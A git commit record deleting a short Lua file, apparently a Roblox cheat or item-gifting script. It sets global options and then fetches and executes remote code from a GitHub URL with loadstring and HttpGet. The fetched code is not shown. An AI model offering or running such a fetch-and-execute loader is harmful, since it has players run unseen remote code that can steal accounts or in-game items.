0077faeb5ba6500228838da30fc9575dadfd3b78
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-23 02:51:32 +0500

    Delete ZNX_5345.lua

--- ZNX_5345.lua
+++
@@ -1,8 +0,0 @@
-
-_G.Username = "asdas"
-_G.GiftMessage = "asddasdas"
-_G.SendMessage = "asdasd1"
-_G.Diamonds = 11
-_G.UnlockPets = true
-_G.AntiLeave = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTINGCOMMUNITY/SCRIPTS/ZNX_5345.lua"))()
